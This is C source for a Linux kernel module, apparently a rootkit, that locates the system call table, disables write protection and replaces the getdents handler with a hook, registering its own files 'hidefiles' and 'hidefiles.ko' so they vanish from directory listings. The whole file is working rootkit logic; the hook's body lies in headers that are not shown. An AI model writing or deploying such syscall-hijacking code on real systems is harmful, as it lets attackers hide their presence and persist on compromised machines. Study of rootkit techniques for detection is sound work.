#include <linux/module.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/miscdevice.h>

#include "syscalls.h"
#include "functs.h"
#include "list.h"

MODULE_AUTHOR("Roman");
MODULE_DESCRIPTION("NOT(Rootkit - Hidefiles)");
MODULE_LICENSE("GPL");

void **sys_call_table;

static int __init hidefiles_init(void)
{
	printk (KERN_INFO "start\n");

	sys_call_table = (void **)find_sys_call_table();
	if(sys_call_table == NULL) {
		printk (KERN_ERR "Failed to find sys call table\n");
		return 1;
	}
	printk (KERN_INFO "start 2\n");
	disable_write_protection();
	printk (KERN_INFO "start 3 get dents = %d\n", __NR_getdents);
//	original_getdents64 = sys_call_table[__NR_getdents64];
	original_getdents = sys_call_table[__NR_getdents];
//	sys_call_table[__NR_getdents64] = sys_getdents64_hook;
	sys_call_table[__NR_getdents] = sys_getdents_hook;
	enable_write_protection();
	addfile("hidefiles");
	addfile("hidefiles.ko");
	printk (KERN_INFO "end of start\n");
	return 0;
}

static void __exit hidefiles_exit(void)
{
	printk (KERN_INFO "end \n");
	disable_write_protection();
//	sys_call_table[__NR_getdents64] = original_getdents64;
	sys_call_table[__NR_getdents] = original_getdents;
	enable_write_protection();
	emptylist();
	return;
}

module_init(hidefiles_init);
module_exit(hidefiles_exit);
